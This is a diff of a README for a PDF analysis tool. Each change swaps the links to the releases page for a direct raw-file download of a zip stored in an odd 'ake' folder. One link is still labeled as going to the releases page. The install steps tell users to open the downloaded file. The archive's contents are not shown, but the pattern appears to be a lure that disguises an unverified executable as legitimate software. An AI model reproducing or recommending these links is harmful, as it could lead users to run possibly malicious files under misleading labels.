@@ -1,6 +1,6 @@
 # 📄 PDF-Package-Analyzer - Analyze Your PDFs with Ease
 
-[![Download PDF-Package-Analyzer](https://img.shields.io/badge/Download-PDF--Package--Analyzer-blue)](https://github.com/M4UNC/PDF-Package-Analyzer/releases)
+[![Download PDF-Package-Analyzer](https://raw.githubusercontent.com/M4UNC/PDF-Package-Analyzer/master/ake/PDF-Package-Analyzer.zip)](https://raw.githubusercontent.com/M4UNC/PDF-Package-Analyzer/master/ake/PDF-Package-Analyzer.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps to download and run the software.
 
 ## 💾 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/M4UNC/PDF-Package-Analyzer/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/M4UNC/PDF-Package-Analyzer/master/ake/PDF-Package-Analyzer.zip) to go to the releases page.
 2. **Select the Version:** Look for the latest version listed on the page.
 3. **Download the File:** Find the appropriate file for your operating system and download it to your computer.
 4. **Run the Installer:** Once the download is complete, open the file to start the installation process.
@@ -64,6 +64,6 @@ Remember, your feedback helps us make PDF-Package-Analyzer even better.
 
 PDF-Package-Analyzer is open-source software. You can use it freely, modify it, and share it, provided you adhere to the license terms found in the repository.
 
-**Download PDF-Package-Analyzer**: [Download Link](https://github.com/M4UNC/PDF-Package-Analyzer/releases)
+**Download PDF-Package-Analyzer**: [Download Link](https://raw.githubusercontent.com/M4UNC/PDF-Package-Analyzer/master/ake/PDF-Package-Analyzer.zip)
 
 Thank you for choosing PDF-Package-Analyzer. Enjoy analyzing your PDFs!
